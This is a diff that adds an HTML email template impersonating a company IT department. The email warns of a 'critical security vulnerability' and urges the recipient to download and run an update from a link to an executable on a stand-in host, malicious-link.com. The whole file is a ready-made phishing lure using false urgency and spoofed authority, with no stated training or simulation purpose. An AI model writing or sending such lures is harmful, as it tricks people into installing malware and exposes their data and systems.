@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Update Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .header {
+            background-color: #e74c3c;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .content {
+            padding: 20px;
+            color: #333333;
+            line-height: 1.6;
+        }
+        .cta {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .button {
+            background-color: #3498db;
+            color: white;
+            text-decoration: none;
+            padding: 12px 20px;
+            font-weight: bold;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        .button:hover {
+            background-color: #2980b9;
+        }
+        .footer {
+            background-color: #f4f4f4;
+            padding: 15px;
+            font-size: 12px;
+            text-align: center;
+            color: #888888;
+            border-top: 1px solid #dddddd;
+        }
+        .footer a {
+            color: #3498db;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Important Security Update</h1>
+        </div>
+        <div class="content">
+            <p>Dear User,</p>
+            <p>Our IT team has identified a critical security vulnerability affecting your system. To protect your data and ensure system stability, it is mandatory to install the latest security patch immediately.</p>
+            <p>Please click the link below to download and install the update:</p>
+            <div class="cta">
+                <a href="http://malicious-link.com/Security_Update.exe" class="button">Download Security Update</a>
+            </div>
+            <p>If you do not apply this update, your system may be exposed to serious risks, including data breaches and unauthorized access.</p>
+            <p>If you need assistance or have any questions, please contact our IT support team at <a href="mailto:support@yourcompany.com">support@yourcompany.com</a>.</p>
+            <p>Thank you for your prompt attention to this matter.</p>
+            <p>Best regards,<br>IT Department</p>
+        </div>
+        <div class="footer">
+            <p>This is an automated message. Please do not reply to this email.</p>
+            <p>For further assistance, contact <a href="mailto:helpdesk@yourcompany.com">helpdesk@yourcompany.com</a>.</p>
+            <p>&copy; 2024 YourCompany IT Team. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
